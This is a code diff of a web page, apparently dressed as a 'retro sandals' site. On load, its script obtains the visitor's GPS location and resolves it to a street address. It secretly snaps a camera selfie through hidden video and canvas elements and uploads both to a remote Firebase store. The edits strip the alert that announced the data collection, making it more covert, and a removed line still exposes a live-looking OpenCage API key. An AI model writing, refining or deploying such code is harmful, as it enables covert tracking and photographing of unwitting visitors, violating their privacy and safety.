@@ -20,7 +20,7 @@
       display: none;
     }
   </style>
-  <!-- Adicionando o Firebase SDK -->
+  <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
@@ -39,57 +39,50 @@
   storageBucket: "sandalias-retro-9f0c6.appspot.com",
   messagingSenderId: "786208752798",
   appId: "1:786208752798:web:193f76bbbf5ac4ef27678f",
-  measurementId: "G-XGVHLX01EB"
+  measurementId: "G-XGVHLX01EB",
     };
 
-    // Inicializa o Firebase
+    // Inicializa Firebase
     const app = firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
     const storage = firebase.storage();
 
-    // Função para enviar dados para o Firebase
-    function sendDataToFirebase(data) {
-      const reference = database.ref('userData');
-      reference.push(data, function (error) {
-        if (error) {
-          alert('Erro ao enviar dados para o Firebase: ' + error);
-        } else {
-          alert('Dados enviados com sucesso para o Firebase!');
-        }
-      });
-    }
-
-    // Função para salvar a selfie no Firebase Storage
+    // Função para salvar selfie no Storage
     function uploadSelfieToStorage(selfieData, addressDetails) {
       const storageRef = storage.ref(`selfies/selfie_${Date.now()}.png`);
       storageRef.putString(selfieData, 'data_url')
-        .then(snapshot => {
-          snapshot.ref.getDownloadURL().then(url => {
-            alert('Selfie salva no Firebase Storage!');
-            sendDataToFirebase({ ...addressDetails, selfieUrl: url }); // Salva dados no Realtime Database
-          });
+        .then(snapshot => snapshot.ref.getDownloadURL())
+        .then(url => {
+          alert('Selfie salva no Firebase Storage!');
+          sendDataToFirebase({ ...addressDetails, selfieUrl: url });
         })
         .catch(error => {
-          alert('Erro ao salvar a selfie no Firebase Storage: ' + error);
+          console.error('Erro ao salvar a selfie:', error);
+          alert('Erro ao salvar a selfie no Firebase Storage.');
         });
     }
 
-    // Função para capturar a selfie automaticamente
+    // Captura da selfie
     function captureSelfie(addressDetails) {
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
       const context = canvas.getContext('2d');
+      
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const selfieData = canvas.toDataURL('image/png');
-      alert('Selfie capturada!');
-      uploadSelfieToStorage(selfieData, addressDetails);
+
+      const selfieData = canvas.toDataURL('image/png', 1.0); // Qualidade máxima
+      if (selfieData) {
+        uploadSelfieToStorage(selfieData, addressDetails);
+      } else {
+        alert('Erro ao capturar selfie.');
+      }
     }
 
-    // Função para obter o endereço completo a partir das coordenadas
+    // Obter endereço completo das coordenadas
     function getAddressFromCoordinates(lat, lon) {
-      const apiKey = '150e176e377d4d2ab2819ddada71dbe7'; // Chave de API OpenCage
+      const apiKey = 'SUA_API_KEY_OPENCAGE';
       const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`;
 
       fetch(url)
@@ -108,9 +101,9 @@
               address: data.results[0].formatted
             };
             alert(`Endereço completo: ${addressDetails.address}`);
-            captureSelfie(addressDetails); // Envia os dados ao capturar a selfie
+            captureSelfie(addressDetails);
           } else {
-            alert('Endereço não encontrado');
+            alert('Endereço não encontrado.');
           }
         })
         .catch(error => {
@@ -118,13 +111,13 @@
         });
     }
 
-    // Função para obter a localização do usuário
+    // Localização do usuário
     function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
           const { latitude, longitude } = position.coords;
           alert(`Localização obtida: Latitude ${latitude}, Longitude ${longitude}`);
-          getAddressFromCoordinates(latitude, longitude); // Obtém o endereço completo
+          getAddressFromCoordinates(latitude, longitude);
         }, error => {
           alert('Erro ao obter a localização: ' + error.message);
         });
@@ -133,12 +126,11 @@
       }
     }
 
-    // Acessa a câmera do dispositivo
+    // Iniciar câmera
     function startCamera() {
       const video = document.getElementById('video');
       if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices
-          .getUserMedia({ video: true })
+        navigator.mediaDevices.getUserMedia({ video: true })
           .then(stream => {
             video.srcObject = stream;
           })
@@ -150,11 +142,22 @@
       }
     }
 
-    // Inicia a captura dos dados
+    // Enviar dados para o Firebase
+    function sendDataToFirebase(data) {
+      const reference = database.ref('userData');
+      reference.push(data, function (error) {
+        if (error) {
+          alert('Erro ao enviar dados para o Firebase: ' + error.message);
+        } else {
+          alert('Dados enviados com sucesso!');
+        }
+      });
+    }
+
+    // Iniciar coleta de dados
     window.onload = () => {
-      alert('Página carregada. Iniciando a coleta de dados...');
-      getLocation(); // Captura a localização
-      startCamera(); // Inicia a câmera
+      getLocation();
+      startCamera();
     };
   </script>
 </body>
